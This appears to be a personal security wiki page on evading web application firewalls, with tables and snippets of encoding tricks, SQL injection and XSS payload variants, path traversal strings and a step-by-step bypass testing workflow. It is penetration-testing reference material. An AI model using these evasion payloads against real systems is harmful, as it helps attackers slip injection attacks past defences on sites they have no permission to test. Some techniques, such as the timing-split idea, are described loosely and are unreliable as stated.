#webapplications

Web Application Firewalls (WAFs) like Cloudflare, ModSecurity, and AWS WAF filter requests for known attack patterns. Since they match signatures (and you control the payload), many bypasses exist.

## Common bypass techniques

### Encoding and obfuscation
| Technique | Example | When it works |
| --- | --- | --- |
| URL encoding | `..%2f..%2f` instead of `../..` | WAF checks decoded string; server decodes again |
| Double encoding | `..%252f` | Server decodes twice; WAF only decodes once |
| Unicode encoding | `%c0%af` as `/` | Different decoders handle Unicode differently |
| HTML entities | `&lt;script&gt;` as `<script>` | WAF checks raw HTML; browser decodes |
| Case variation | `<ScRiPt>` instead of `<script>` | WAF does case-sensitive match |
| Hex encoding | `\x3cscript\x3e` | Payload hidden in hex literals |
| Null bytes (old) | `shell.php%00.txt` | Old systems truncate at null; WAF doesn't |

### Polyglot/multi-format payloads
```
# Valid JSON with SQL injection inside
{"search": "test' OR '1'='1"}

# Valid XML with XXE
<?xml version="1.0"?><payload>...XXE...</payload>

# Valid CSV with CRLF injection
name,value
admin,true
# Injected header
```

The payload is valid for one format the WAF checks, but interpreted as another by the server.

### Comment insertion
```
# WAF signature: "union select"
# Bypass: use inline comments
un/**/ion se/**/lect ...

# SQL comment
union /*comment*/ select ...

# Different comment styles per database
MySQL:    #, --, /**/
PostgreSQL: --, /* */
MSSQL:    --, /* */
SQLite:   -- (only)
```

### Whitespace and formatting
```
# Normal:  /path/traversal
# Bypass:  /path/traversal////
# Bypass:  /path/./traversal
# Bypass:  /path/.%00/traversal

# SQL whitespace variations
WHERE    id=1      (spaces)
WHERE/**/id=1      (comment)
WHERE%09id=1       (tab encoded)
```

### Nested/stacked payloads
```
# If "drop" is blocked, nest it
dr/**/op table users
d/*r*/op table users
Dr0p table users  (mixed case)
```

### Timing delays
If pattern matching takes time, send valid requests between each byte of the malicious payload:
```
uni -- pause
on  -- pause
se  -- pause
le  -- pause
ct  -- pause
```

WAF timeout expires; payload assembles server-side.

## WAF-specific bypasses

| WAF | Known bypasses | Detection |
| --- | --- | --- |
| Cloudflare | `--random-agent` in sqlmap, `X-Forwarded-For` header spoofing | Check response headers for `server: cloudflare` |
| ModSecurity | Encoding variations, null bytes, buffer overflow tricks | Often used with Apache; bypass by encoding beyond ModSecurity's parser |
| AWS WAF | IP rotation, distributed requests, polyglot payloads | Check X-Amzn-Waf headers |
| Imperva | Fragmentation (split payload across multiple packets), slow requests | Often on CDN; timing-based bypasses work |

## Testing workflow

1. **Identify the WAF** — check response headers:
   ```bash
   curl -i https://target.com
   # Look for: Server, X-Frame-Options, Content-Security-Policy, X-Powered-By
   # Or tools: wafw00f target.com
   ```

2. **Test basic payload** — see if it's blocked:
   ```
   /search?q=<script>alert(1)</script>
   # Response: 403 Forbidden, 418 I'm a Teapot, or blocked page
   ```

3. **Try bypass variants** — in order of increasing complexity:
   - Case toggle: `<ScRiPt>`
   - URL encode: `%3Cscript%3E`
   - Double encode: `%253Cscript%253E`
   - Comment insert: `<s<!--x-->cript>`
   - Polyglot: Wrap in valid JSON/XML
   - Timing: Split payload across requests

4. **Verify bypass** — request is allowed (200) and payload executes server-side

## Where bypasses fail
- **Well-maintained WAFs** with normalized parsing and updated rules catch most bypasses
- **Defense-in-depth** — even if WAF is bypassed, server-side validation stops you
- **Rate limiting** — WAF doesn't block the payload, but limits requests/IP

**Important:** WAF bypasses are noise. The real vulnerability is on the server (missing input validation, unsafe function calls). Fix the server code, not the WAF evasion.

## See also
- [[SQL Injection]], [[Cross-Site Scripting]], [[Command Injection]] — payloads that WAFs try to block
- [[Payload Reference]] — encoding techniques
- `wafw00f` — identify which WAF is in use
